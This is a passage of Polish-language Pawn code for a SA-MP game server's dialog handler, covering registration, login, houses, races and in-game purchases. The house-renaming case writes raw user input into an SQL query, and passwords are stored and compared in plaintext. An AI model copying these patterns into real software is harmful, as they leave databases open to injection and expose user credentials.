			ShowPlayerDialog(playerid,30,2,"{3FBAFC}Polski TOP Serwer",""C_O"Komendy Gracza\n"C_B"Komendy Vipa\n"C_O"Komendy Admina \n"C_B"Komendy Gangu \n"C_O"Regulamin Serwera \n"C_B"Konto VIP \n{A40000}Autor GameMode","Dalej","Wyjdz");
			}else{
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			new StrinG[1500];
			strcat(StrinG, "/reg"C_B" - Regulamin serwera{FF0000}\n/autorzy"C_B" - Twórcy serwera{FF0000}\n/vip"C_B" - Kupno konta z przywilejami.\n"C_O"/report"C_B" - Zg³aszasz naruszenie regulaminu\n"C_O"/serwer"C_B" - Statystyki serwera"C_O"\n"C_O"/zmienhaslo"C_B" - Zmiana has³a konta"C_O"\n"C_O"/zmiennick"C_B" - Zmiana nicku konta"C_O"\n/teles"C_B" - Lista teleportów.");
			strcat(StrinG, ""C_O"\n/v"C_B" - Spawn pojazdów."C_O"\n/pojazdy"C_B" - Lista pojazdów."C_O"\n/zycie"C_B" - Kupno ¿ycia."C_O"\n/pancerz"C_B" - Kupno pancerza."C_O"\n/napraw"C_B" - Naprawiasz pojazd."C_O"\n/flip"C_B" - Stawiasz pojazd na 4 ko³a."C_O"\n/kill"C_B" - Pope³niasz samobjstwo."C_O"\n/tune"C_B" - Tuning pojazdu."C_O"\n/rampy"C_B" - Ustawienia ramp"C_O"\n");
			strcat(StrinG, "/dzien"C_B" - Zmieniasz porê dnia na dzieñ."C_O"\n/noc"C_B" - Zmieniasz porê dnia na noc."C_O"\n/ptele"C_B" - Twoje w³asne teleporty"C_O"\n/katapulta"C_B" - Wyskakujesz z samolotu ze spadochronem"C_O"\n/flo"C_B" - Pozbywasz siê flooda"C_O"\n/odlicz"C_B" - W³¹czasz odliczanie"C_O"\n/loadpos"C_B" - Wczytujesz zapisan¹ pozycjê"C_O"\n");
			strcat(StrinG, "/savepos"C_B" - Zapisujesz pozycjê"C_O"\n/los"C_B" - Dostajesz losow¹ nagrodê\n"C_O"/cb"C_B" - CB-Radio\n"C_O"- Transport towarów\n/"C_B"zalewy "C_O"- zalewy do ³owienia ryb\n/"C_B"dotacja "C_O"- dostajesz 500 tys$\n/"C_B"kolor "C_O"- zmieniasz swój kolor na serwerze.");

			ShowPlayerDialog(playerid,33,0,"Komendy graczy",StrinG,"<<<","Wyjdz");

		}
		return 1;
	}


	if(dialogid == 33){
		if(response){
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			new StrinG[1500];
			strcat(StrinG, "/lock"C_B" - Zamykasz pojazd"C_O"\n/unlock"C_B" - Otwierasz pojazd"C_O"\n/spadochron"C_B" - Dostajesz spadochron"C_O"\n/styl"C_B" - Styl walki"C_O"\n/anims"C_B" - Animacje"C_O"\n/bronie"C_B" - Kupujesz broñ"C_O"\n/neon"C_B" - Neony w pojazdach"C_O"\n/givecash"C_B" - Dajesz kasê"C_O"\n");
			strcat(StrinG, "/figurki"C_B" - Informacje o figurkach\n"C_O"/pos"C_B" - Sprawdzasz pozycje na mapie"C_O"\n/hp"C_B" - Sprawdzasz iloœæ zycia"C_O"\n/dystans"C_B" - Sprawdzasz odleg³oœæ do innego gracza"C_O"\n");
			strcat(StrinG, "/wyscigi"C_B" - Lista wyœcigów"C_O"\n/clearme"C_B" - Czyœcisz sobie czat\n"C_O"/me"C_B" - Czynnoœæ\n"C_O"/hitman"C_B" - Nagroda za gracza\n"C_O"/zabawy"C_B" - Informacje o zabawach\n"C_O"/losexp"C_B" - Losujesz sobie exp.\n"C_O"/top "C_B"- Toplisty graczy\n"C_O"");
			strcat(StrinG, "/zw"C_B" - Zaraz wracam\n"C_O"/jj"C_B" - Ju¿ jestem\n"C_O"/staty "C_B"- Statystyki graczy\n"C_O"/rec "C_B" - Tryb nagrywania"C_O"\n/solo"C_B" - Rozgrywka PvP\n"C_O"/resrace"C_B" - Restart wyœcigu\n"C_O"/nitro"C_B" - Zmiana rodzaju nitro\n"C_O"/pytanie"C_B" - pytanie do administracji");

			ShowPlayerDialog(playerid,32,0,"Komendy Gracza",StrinG,"Cofnij",">>>");

		}
		return 1;
	}
	if(dialogid == 111)//Dialog do komendy /zalewy
	{
		if(response)
		{
			switch(listitem)//Informacje przy teleportacji ;d
			{
				case 0:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);//Dzwiêk
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"1");//Informacja
					SetPlayerPos(playerid,2024.4911,1562.7010,10.8203);//Pozycja x,z.y xd
				}
				case 1:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"2");
					SetPlayerPos(playerid,2906.6626,-1955.3367,1.9469);
				}
				case 2:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"3");
					SetPlayerPos(playerid,2602.2893,-2332.7312,13.6250);
				}
				case 3:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"4");
					SetPlayerPos(playerid,1264.6476,-2406.8391,10.9061);
				}
				case 4:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"5");
					SetPlayerPos(playerid,1221.7979,-2482.7493,12.8136);
				}
				case 5:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"6");
					SetPlayerPos(playerid,960.3103,-2166.3818,13.0938);
				}
				case 6:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"7");
					SetPlayerPos(playerid,762.8705,-1882.5219,2.1020);
				}
				case 7:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"8");
					SetPlayerPos(playerid,274.5963,-1892.5452,1.3290);
				}
				case 8:
				{
					PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
					SCM(playerid,0xFFFFFFFF,""C_B"|£owisko| "C_O"Teleportowano do zalewu nr: "C_B"9");
					SetPlayerPos(playerid,-2967.0315,-798.8416,1.6542);
				}
			}
		}
		return 1;
	}
	if(dialogid == 9999) return 0;
	if(dialogid == 9998) return TogglePlayerControllable(playerid, true), 1;

	if(pInFun[playerid] == 1 && dialogid != 3309) return 1;

	switch(dialogid)
	{
		case 0://
		{
			if(!response)
				return SCM(playerid, 0xFFFFFFFF, "Rejestracja na tym serwerze jest obowi¹zkowa!"), Kick(playerid);

			switch(strlen(inputtext))
			{
				case 5..20:
				{
					new ip[24], password[30];
					GetPlayerIp(playerid, ip, 24);
					mysql_real_escape_string(inputtext, password);
					format(strx, sizeof strx, "INSERT INTO `players` (`nick`, `password`, `date`, `lastdate`, `ip`) VALUES ('%s', '%s', '%d.%s.%dr.', '%d.%s.%dr.', '%s');", pName[playerid], password, day, namemonth[month-1], year,day, namemonth[month-1], year, ip);
					mysql_query(strx);
					mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'players'");
					format(strx, sizeof strx, ""C_B"%s "C_O"zarejestrowa³ siê na serwerze.", pName[playerid]);
					SCMToAll(-1, strx);
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					InfoBox(playerid, ""C_O"Twoja konto zosta³o zarejestrowane.\n\nHas³o zachowaj tylko dla siebie.\nAby zmieniæ has³o u¿yj komendy "C_B"/zmienhaslo\n"C_O"Wszystkie komendy s¹ opisane pod "C_B"/cmd");
					TogglePlayerControllable(playerid, true);

					SetPVarInt(playerid, "timePlay", GetTickCount());
					SetPVarInt(playerid, "Logged", 1);

					pSpawnWeapon[playerid][0] = 8;
					pSpawnWeapon[playerid][1] = 24;
					pSpawnWeapon[playerid][2] = 27;
					pSpawnWeapon[playerid][3] = 29;
					pSpawnWeapon[playerid][4] = 30;
					pSpawnWeapon[playerid][5] = 33;

				}
				default:
					return TogglePlayerControllable(playerid, false), Dialog(playerid, 0, DIALOG_INPUT, ""C_O"Has³o musi zawieraæ od "C_B"5 "C_O"do "C_B"20 "C_O"znaków!\n\nWymyœl inne has³o.", "Zarejestruj", "WyjdŸ");
			}
		}
		case 1://
		{
			if(!response)
				return SCM(playerid, 0xFFFFFFFF, "Ten nick jest ju¿ zarejestrowany, musisz siê zalogowaæ!"), Kick(playerid);

			new ip[24], password[30];
			GetPlayerIp(playerid, ip, 24);
			mysql_real_escape_string(inputtext, password);

			format(strx, sizeof strx, "SELECT `gang`,`money`,`score`,`privcar`,`przebieg`,`vip`,`admin`,`jail`,`nitro`,`ramp` FROM `players` WHERE `nick` = '%s' AND `password` = '%s'", pName[playerid], password);
			mysql_query(strx);
			mysql_store_result();

			if(!mysql_num_rows())
			{
				if(GetPVarInt(playerid, "probaLogowania") >= 3) return SCM(playerid, 0xFFFFFFFF, "Przekroczy³eœ dozwolon¹ iloœæ prób logowania."), Kick(playerid);

				SetPVarInt(playerid, "probaLogowania", GetPVarInt(playerid, "probaLogowania") + 1);
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				TogglePlayerControllable(playerid, 0);
				Dialog(playerid, 1, DIALOG_PASS, ""C_O"Niepoprawne has³o!\nSpróbuj jeszcze raz", "Zaloguj", "WyjdŸ");
				mysql_free_result();
			}
			else
			{
				new money[12],score[12],vip[12],admin[6],jail[6],nitro[6],ramp[6];

				mysql_fetch_field("money", money);
				mysql_fetch_field("score", score);
				mysql_fetch_field("vip", vip);
				mysql_fetch_field("admin", admin);
				mysql_fetch_field("jail", jail);
				mysql_fetch_field("nitro", nitro);
				mysql_fetch_field("ramp", ramp);

				mysql_free_result();

				SetPVarInt(playerid, "Admin", strval(admin));
				SetPVarInt(playerid, "timePlay", GetTickCount());
				SetPVarInt(playerid, "Logged", 1);
				SetPVarInt(playerid, "pJailed", strval(jail));
				SetPVarInt(playerid, "rNitro", strval(nitro));
				pRamp[playerid][1] = strval(ramp);

				SetPlayerScore(playerid, strval(score) + 1);
				SetPlayerMoney(playerid, strval(money));

				new admlvl[MAX_PLAYER_NAME+1];
				GetPlayerName(playerid, admlvl, sizeof(admlvl));
				AdministratorLevel[playerid] = mysql_PlayerGetInt(admlvl, "admin");

				new vipek[MAX_PLAYER_NAME+1];
				GetPlayerName(playerid, vipek, sizeof(vipek));
				new vips = mysql_PlayerGetInt(vipek, "ifnull(datediff(vip,now()),'-5')");
				if( vips >= 0 ) {
					Vips_Online++;
					Vip[playerid] = true;
					SCM(playerid, 0x33FF99FF, "Zosta³eœ automatycznie zalogowany jako VIP.");

				}

				for(new i; i < MAX_HOUSES; i++)
				{
					if(!strcmp(HouseInfo[i][hOwner], pName[playerid]) && strlen(HouseInfo[i][hOwner]) != 0)
					{
						pHouse[playerid] = i;
						new time = gettime() + (14 * 24 * 60 * 60);
						format(strx, sizeof strx, "UPDATE `house` SET `time` = '%d' WHERE `id` = '%d'", time, HouseInfo[i][hID]);
						mysql_query(strx);
						break;
					}
				}
				new mapojazd[MAX_PLAYER_NAME+1];
				GetPlayerName(playerid, mapojazd, sizeof(mapojazd));
				if(mysql_PlayerGetInt(mapojazd, "privcar") >= 400)
				{
					MaPrivCar[playerid] = true;
					PrivPrzebieg[playerid] = float(mysql_PlayerGetInt(mapojazd, "przebieg"));
				}
				format(strx, 128, ""C_B"%s "C_O"("C_B"%d"C_O") wszed³ na serwer.", pName[playerid], playerid);
				SCMToAll(0xFFFFFFFF, strx);

				mysql_query("UPDATE `stats` SET `value` = `value` + 1 WHERE `name` = 'visit'");
				format(strx, sizeof strx, "UPDATE `players` SET `ip` = '%s', `lastdate` = '%d.%s.%dr.', `visit` = `visit` + 1 WHERE `nick` = '%s'", ip,  day, namemonth[month-1], year, pName[playerid]);
				mysql_query(strx);

			}

		}

		case 2:
		{
			if(!response) return 1;

			if(strlen(inputtext) < 5 || strlen(inputtext) > 20)
				return Dialog(playerid, 2, DIALOG_INPUT, ""C_O"\nHas³o musi zawieraæ od "C_B"5 "C_O"do "C_B"20 "C_O"znaków!\n\nWpisz nowe has³o:", "Zmieñ", "Anuluj");

			new haslo[30];
			mysql_real_escape_string(inputtext, haslo);
			format(strx, sizeof strx, "UPDATE `players` SET `password` = '%s' WHERE `nick` = '%s'", haslo, pName[playerid]);
			mysql_query(strx);
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			format(strx, sizeof strx, "\n"C_O"Twoje has³o zosta³o zmienione!\nNowe has³o to: "C_B"%s", inputtext);
			InfoBox(playerid, strx);
		}

		case 2569:
		{
			if(!response) return 1;

			SetPVarInt(playerid, "saveTypeWeapon", listitem);
			bstrx = "";
			new wname[50];
			switch(listitem)
			{
				case 0:
				{
					for(new i; i < sizeof WeaponList_Slot1; i++)
					{
						GetWeaponName(WeaponList_Slot1[i], wname, sizeof wname);
						format(bstrx, sizeof bstrx, "%s%s\n", bstrx, wname);
					}
					Dialog(playerid, 2570, DIALOG_LIST, bstrx, "Wybierz", "Wróæ");
				}
				case 1:
				{
					for(new i; i < sizeof WeaponList_Slot2; i++)
					{
						GetWeaponName(WeaponList_Slot2[i], wname, sizeof wname);
						format(bstrx, sizeof bstrx, "%s%s\n", bstrx, wname);
					}
					Dialog(playerid, 2570, DIALOG_LIST, bstrx, "Wybierz", "Wróæ");
				}
				case 2:
				{
					for(new i; i < sizeof WeaponList_Slot3; i++)
					{
						GetWeaponName(WeaponList_Slot3[i], wname, sizeof wname);
						format(bstrx, sizeof bstrx, "%s%s\n", bstrx, wname);
					}
					Dialog(playerid, 2570, DIALOG_LIST, bstrx, "Wybierz", "Wróæ");
				}
				case 3:
				{
					for(new i; i < sizeof WeaponList_Slot4; i++)
					{
						GetWeaponName(WeaponList_Slot4[i], wname, sizeof wname);
						format(bstrx, sizeof bstrx, "%s%s\n", bstrx, wname);
					}
					Dialog(playerid, 2570, DIALOG_LIST, bstrx, "Wybierz", "Wróæ");
				}
				case 4:
				{
					for(new i; i < sizeof WeaponList_Slot5; i++)
					{
						GetWeaponName(WeaponList_Slot5[i], wname, sizeof wname);
						format(bstrx, sizeof bstrx, "%s%s\n", bstrx, wname);
					}
					Dialog(playerid, 2570, DIALOG_LIST, bstrx, "Wybierz", "Wróæ");
				}
				case 5:
				{
					for(new i; i < sizeof WeaponList_Slot6; i++)
					{
						GetWeaponName(WeaponList_Slot6[i], wname, sizeof wname);
						format(bstrx, sizeof bstrx, "%s%s\n", bstrx, wname);
					}
					Dialog(playerid, 2570, DIALOG_LIST, bstrx, "Wybierz", "Wróæ");
				}
			}
		}

		case 1240:
		{
			if(!response) return 1;

			SetPVarInt(playerid, "rNitro", listitem);
			format(strx, sizeof strx, "UPDATE `players` SET `nitro` = '%d' WHERE `nick` = '%s'", listitem, pName[playerid]);
			mysql_query(strx);
			SCM(playerid, 0xFFFFFFFF, ""C_O"Nitro zosta³o zmienione.");
		}
		case 568:
		{
			if(!response) return SetPVarInt(playerid, "LastRace", 0);
			if(response) return cmd_resrace(playerid, "");
		}
		case 647:
		{
			if(!response) return 1;

			new i = pHouse[playerid];

			GivePlayerScore(playerid, floatround(HouseInfo[i][hCost] * 0.75));
			format(HouseInfo[i][hOwner], 40, "#");
			format(HouseInfo[i][hName], 40, "Dom na sprzeda¿");

			format(strx, sizeof strx, "UPDATE `house` SET `owner` = '#', `name` = 'Dom na sprzeda¿!', `time` = '0' WHERE `id` = '%d'", HouseInfo[i][hID]);
			mysql_query(strx);
			format(strx, sizeof strx, "* "C_O"Dom na sprzeda¿!\n\n"C_O"Cena: "C_B"%d", HouseInfo[i][hCost]);
			Update3DTextLabelText(HouseInfo[i][hLabel], -1, strx);

			pHouse[playerid] = -1;
			ExitHousePlayer(playerid, i);
			InfoBox(playerid, ""C_O"Dom zosta³ sprzedany!");
			return 1;
		}
		case 645:
		{
			if(!response) return 1;
			new i = pHouse[playerid];

			switch(listitem)
			{
				case 0:
				{
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					format(bstrx, sizeof bstrx, ""C_O"Czy napewno chcesz sprzedaæ swój dom za "C_B"%d$?", floatround(HouseInfo[i][hCost] * 0.75));
					Dialog(playerid, 647, DIALOG_BOX, bstrx, "TAK", "NIE");
				}
				case 1: Dialog(playerid, 649, DIALOG_LIST, ""C_O"Interior 0 - "C_B"[100000$]\n"C_O"Interior 1 - "C_B"[200000$]\n"C_O"Interior 2 - "C_B"[300000$]\n"C_O"Interior 3 - "C_B"[400000$]\n"C_O"Interior 4 - "C_B"[500000$]\n"C_O"Interior 5 - "C_B"[600000$]", "Kup", "Anuluj");
				case 2: Dialog(playerid, 650, DIALOG_LIST, "Stan\nWp³aæ\nWyp³aæ", "OK", "Anuluj");
				case 3:
				{
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					Dialog(playerid, 651, DIALOG_INPUT, ""C_O"Wpisz nowa nazwê domu.\n\n"C_B"UWAGA! "C_O"Wpisywanie obraŸliwych nazw grozi zlikwidowaniem domu!", "Zmieñ", "Anuluj");
				}
				case 4:
				{
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					Dialog(playerid, 652, DIALOG_INPUT, ""C_O"Wpisz ID lub nick gracza, którego chcesz zaprosiæ!", "OK", "Anuluj");
				}
			}
			return 1;
		}
		case 652:
		{
			if(!response) return 1;

			if(!strlen(inputtext)) return SCM(playerid, 0xFFFFFFFF, "Nie zaproszono ¿adnego gracza.");

			if(IsNumeric(inputtext) && strval(inputtext) >= 0 && strval(inputtext) < MAX_PLAYERS)
			{
				if(!IsPlayerConnected(strval(inputtext))) return SCM(playerid, 0xFFFFFFFF, "Ten gracz nie jest po³aczony!");
				if(GetPlayerVirtualWorld(strval(inputtext)) != 0) return SCM(playerid, 0xFFFFFFFF, "Ten gracz nie moze teraz wejœæ do domu!");

				SetPVarInt(strval(inputtext), "hZapro", playerid);
				format(strx, sizeof strx, "Gracz "C_B"%s "C_O" aprasza Ciê do swojego domu! Wpisz "C_B"/gosc", pName[playerid]);
				SCM(strval(inputtext), 0xFFFFFFFF, strx);
				format(strx, sizeof strx, "Zaprosi³eœ "C_B"%s "C_O"do swojego domu!", pName[strval(inputtext)]);
				SCM(playerid, 0xFFFFFFFF, strx);

			}else if(!IsNumeric(inputtext))
			{
				new i = GetPlayerFromNick(inputtext);

				if(i == -1) return SCM(playerid, 0xFFFFFFFF, "Ten gracz nie jest po³¹czony!");
				if(GetPlayerVirtualWorld(i) == 1) return SCM(playerid, 0xFFFFFFFF, "Ten gracz nie moze teraz wejœæ do domu!");

				SetPVarInt(i, "hZapro", playerid);
				format(strx, sizeof strx, "Gracz "C_B"%s "C_O"zaprasza Ciê do swojego domu! Wpisz "C_B"/gosc", pName[playerid]);
				SCM(i, 0xFFFFFFFF, strx);
				format(strx, sizeof strx, "Zaprosi³eœ "C_B"%s "C_O"do swojego domu!", pName[i]);
				SCM(playerid, 0xFFFFFFFF, strx);

			}else SCM(playerid, 0xFFFFFFFF, "Nieprawid³owy nick!");

			return 1;
		}
		case 651:
		{
			if(!response) return 1;

			if(!strlen(inputtext))
				return InfoBox(playerid, ""C_O"Wpisana nazwa jest nieprawid³owa!\n");

			if(strlen(inputtext) > 40)
				return InfoBox(playerid, ""C_O"Wpisana nazwa jest zbyt d³uga! Maks. "C_B"40 "C_O"znaków.\n");

			new i = pHouse[playerid];
			format(strx, sizeof strx, "UPDATE `house` SET `name` = '%s' WHERE `id` = '%d'", inputtext, HouseInfo[i][hID]);
			mysql_query(strx);

			format(HouseInfo[i][hName], 40, "%s", inputtext);

			format(strx, sizeof strx, ""C_B"%s\n\n"C_O"W³aœciciel: "C_B"%s\n"C_O"Cena: "C_B"%d", inputtext, pName[playerid], HouseInfo[i][hCost]);
			Update3DTextLabelText(HouseInfo[i][hLabel], -1, strx);

			InfoBox(playerid, ""C_O"Zmieniono nazwê domu.");
			return 1;
		}
		case 650:
		{
			if(!response) return 1;

			new i = pHouse[playerid];
			switch(listitem)
			{
				case 0:
				{
					new money[12];
					format(strx, sizeof strx, "SELECT `money` FROM `house` WHERE `id` = '%d'", HouseInfo[i][hID]);
					mysql_query(strx);
					mysql_store_result();
					mysql_fetch_field("money", money);
					mysql_free_result();
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					format(strx, sizeof strx, ""C_O"W sejfie jest: "C_B"%s$", money);
					Dialog(playerid, 640, DIALOG_BOX, strx, "Wróæ", "Zamknij");
				}
				case 1: Dialog(playerid, 641, DIALOG_INPUT, ""C_O"Wpisz kwotê, któr¹ chcesz wp³aciæ:", "Wp³aæ", "Wróæ");
				case 2: Dialog(playerid, 642, DIALOG_INPUT, ""C_O"Wpisz kwotê, któr¹ chcesz wyp³aciæ:", "Wyp³aæ", "Wróæ");
			}
			return 1;
		}
		case 642:
		{
			if(!response) return Dialog(playerid, 650, DIALOG_LIST, "Stan\nWp³aæ\nWyp³aæ", "OK", "Anuluj");

			new i = pHouse[playerid];
			new money[12];
			format(strx, sizeof strx, "SELECT `money` FROM `house` WHERE `id` = '%d'", HouseInfo[i][hID]);
			mysql_query(strx);
			mysql_store_result();
			mysql_fetch_field("money", money);
			mysql_free_result();
			new kwota = strval(money);

			if(strval(inputtext) == 0 || strval(inputtext) < 0 || kwota < strval(inputtext))
				return Dialog(playerid, 640, DIALOG_BOX, ""C_O"Podano niepoprawn¹ liczbê lub w sejfie nie ma tyle gotówki.", "Wróæ", "Zamknij");

			format(strx, sizeof strx, "UPDATE `house` SET `money` = `money` - '%d' WHERE `id` = '%d'", strval(inputtext), HouseInfo[i][hID]);
			mysql_query(strx);
			GivePlayerMoney(playerid, strval(inputtext));
			InfoBox(playerid, ""C_O"Dokonano zmian w sejfie.");
			return 1;
		}
		case 641:
		{
			if(!response) return Dialog(playerid, 650, DIALOG_LIST, "Stan\nWp³aæ\nWyp³aæ", "OK", "Anuluj");

			if(strval(inputtext) == 0 || strval(inputtext) < 0 || strval(inputtext) > GetPlayerMoney(playerid))
				return Dialog(playerid, 640, DIALOG_BOX, "Podano niepoprawn¹ liczbê lub nie masz przy sobie tyle gotówki.", "Wróæ", "Zamknij");

			new i = pHouse[playerid];

			GivePlayerMoney(playerid, strval(inputtext) * -1);
			format(strx, sizeof strx, "UPDATE `house` SET `money` = `money` + '%d' WHERE `id` = '%d'", strval(inputtext), HouseInfo[i][hID]);
			mysql_query(strx);
			InfoBox(playerid, ""C_O"Dokonano zmian w sejfie.");
			return 1;
		}
		case 640:
		{
			if(!response)return 1;
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			Dialog(playerid, 650, DIALOG_LIST, "Stan\nWp³aæ\nWyp³aæ", "OK", "Anuluj");
			return 1;
		}
		case 649:
		{
			if(!response) return 1;

			new i = pHouse[playerid];
			new cena = ((listitem + 1)* 100000);

			if(HouseInfo[i][hInt] == listitem)
				return InfoBox(playerid, ""C_O"Masz ju¿ takie wnêtrze!");

			if(GetPlayerMoney(playerid) < cena)
				return InfoBox(playerid, ""C_O"Nie masz tyle pieniêdzy!");

			GivePlayerMoney(playerid, cena * -1);

			HouseInfo[i][hInt] = listitem;
			format(strx, sizeof strx, "UPDATE `house` SET `interior` = '%d' WHERE `id` = '%d'", listitem, HouseInfo[i][hID]);
			mysql_query(strx);

			InfoBox(playerid, "\n"C_O"Wnêtrze zosta³o zmienione!\n");
			TeleportToHouse(playerid, i, 0);
			return 1;
		}
		case 800:
		{
			if(!response) return 1;

			if(pHouse[playerid] != -1)
				return InfoBox(playerid, "\n"C_O"Jesteœ ju¿ w³aœcicielem innego "C_B"domku!\n");

			new i = GetPVarInt(playerid, "eHouseID"), mstr[250];
			if(GetPlayerMoney(playerid) < HouseInfo[i][hCost])
				return InfoBox(playerid, "\n"C_O"Nie posiadasz przy sobie tyle "C_B"gotówki!\n");

			GivePlayerMoney(playerid, (HouseInfo[i][hCost] * -1));
			format(HouseInfo[i][hName], 40, "Mój domek - %s", pName[playerid]);
			format(HouseInfo[i][hOwner], 40, "%s", pName[playerid]);
			new time = gettime() + (14 * 24 * 60 * 60);
			format(mstr, 250, "UPDATE `house` SET `owner` = '%s', `name` = '%s', `time` = '%d', `password` = '' WHERE `id` = '%d'", pName[playerid], HouseInfo[i][hName], time, HouseInfo[i][hID]);
			mysql_query(mstr);

			pHouse[playerid] = i;

			format(mstr, 250, ""C_B"%s\n\n"C_O"W³aœciciel: "C_B"%s\n"C_O"Cena: "C_B"%d", HouseInfo[i][hName], HouseInfo[i][hOwner], HouseInfo[i][hCost]);
			Update3DTextLabelText(HouseInfo[i][hLabel], -1, mstr);

			InfoBox(playerid, "\n"C_O"Kupi³eœ domek!\n");
		}
		case 41:
		{
			if(!response || !Vip[playerid]) return 1;

			SetPlayerColor(playerid, playerColors[listitem]);
			SendPlayerMessageToPlayer(playerid, playerid, ""C_B"< - Tak teraz wygl¹da twój nick!");
		}
		case 311:
		{
			if(!response) return 1;

			for(new i; i < RacesCount; i++)
			{
				if(!strcmp(RaceInfo[i][Rname], inputtext))
				{
					SetPVarInt(playerid, "guiRaceID", i);
					break;
				}
			}
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			Dialog(playerid, 312, DIALOG_LIST, "Najlepsze czasy\nTwój rekord\nWeŸ udzia³", "Wybierz", "Powrót");
		}
		case 313:
		{
			if(!response) return cmd_wyscigi(playerid, " ");
		}
		case 312:
		{
			if(!response) return cmd_wyscigi(playerid, " ");

			new i = GetPVarInt(playerid, "guiRaceID");

			switch(listitem)
			{
				case 0:
				{
					new mstr[160];
					format(mstr, 160, "SELECT `nick`,`time` FROM `race_record` WHERE `race_id` = '%d' ORDER BY `time` ASC LIMIT 10", RaceInfo[i][Rid]);
					mysql_query(mstr);
					mysql_store_result();
					format(bstrx, sizeof bstrx, ""C_B"%s\n\n"C_O"", RaceInfo[i][Rname]);

					new nick[30], value, pos = 1;
					while(mysql_fetch_row(mstr, "|"))
					{
						sscanf(mstr, "p<|>s[30]d", nick, value);
						format(bstrx, sizeof bstrx, "%s%d - %s - %s\n", bstrx, pos, nick, ToTime(value));
						pos++;
					}
					mysql_free_result();
					Dialog(playerid, 313, DIALOG_BOX, bstrx, "Zamknij", "Powrót");
				}
				case 1:
				{
					new mstr[160];
					format(mstr, 160, "SELECT `time` FROM `race_record` WHERE `race_id` = '%d' AND `nick` = '%s' LIMIT 1", RaceInfo[i][Rid], pName[playerid]);
					mysql_query(mstr);
					mysql_store_result();
					new param[32];
					mysql_fetch_row(param);

					if(strval(param) == 0)
					{
						PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
						Dialog(playerid, 313, DIALOG_BOX, "\n"C_O"Nie przejecha³eœ tej trasy!\nAby sprawdziæ rekord musisz przejechaæ tê trasê przynajmniej raz.\n", "Zamknij", "Wróæ");
						}else{
						new time = strval(param);
						format(mstr, 160, ""C_O"Twój rekord: "C_B"%s\n"C_O"Trasa: "C_B"%s", ToTime(time), RaceInfo[i][Rname]);
						Dialog(playerid, 313, DIALOG_BOX, mstr, "Zamknij", "Wróæ");
					}
					mysql_free_result();
				}
				case 2:
				{
					SetPlayerVirtualWorld(playerid, 0);
					SetPlayerInterior(playerid, 0);
					SetPlayerPos(playerid, RaceInfo[i][Rx],RaceInfo[i][Ry],RaceInfo[i][Rz]);
					SCM(playerid, 0xFFFFFFFF, "Wpisz "C_B"/race "C_O"aby wzi¹æ udzia³ w wyœcigu!");
				}
			}
		}
		case 43:
		{
			if(response || Administrator[playerid] < 1) return 1;

			DestroyPickup(walizka[1]);
			walizka[0] = -1;
			walizka[2] = 0;
			walizka[1] = -1;
			TextDrawHideForAll(WalizkaDraw[0]);
			TextDrawHideForAll(WalizkaDraw[1]);
			SCM(playerid, -1, "Usuniêto!");
			return 1;
		}
		case 21:
		{
			SetPVarInt(playerid, "pEnterPick", 0);

			if(!response) return 1;

			new Float:hp;
			GetPlayerHealth(playerid, hp);

			if(hp >= 100)
				return SCM(playerid, -1, "Nie mo¿esz kupiæ jedzenia, poniewa¿ masz ju¿ pe³ne ¿ycie!");

			switch(listitem)
			{
				case 0:
				{
					if(GetPlayerMoney(playerid) < 100)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					if(hp <= 90)
					{
						SetPlayerHealth(playerid, hp + 10);
					}else SetPlayerHealth(playerid, 100.0);

					GivePlayerMoney(playerid, -100);
				}case 1:
				{
					if(GetPlayerMoney(playerid) < 250)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					if(hp <= 75)
					{
						SetPlayerHealth(playerid, hp + 25);
					}else SetPlayerHealth(playerid, 100.0);

					GivePlayerMoney(playerid, -250);
				}case 2:
				{
					if(GetPlayerMoney(playerid) < 500)
						return InfoBox(playerid, ""C_O"Wróæ jak bêdziesz mia³ "C_B"pieni¹dze!!!");

					if(hp <= 50)
					{
						SetPlayerHealth(playerid, hp + 50);
					}else SetPlayerHealth(playerid, 100.0);

					GivePlayerMoney(playerid, -500);
				}case 3:
				{
					if(GetPlayerMoney(playerid) < 1000)
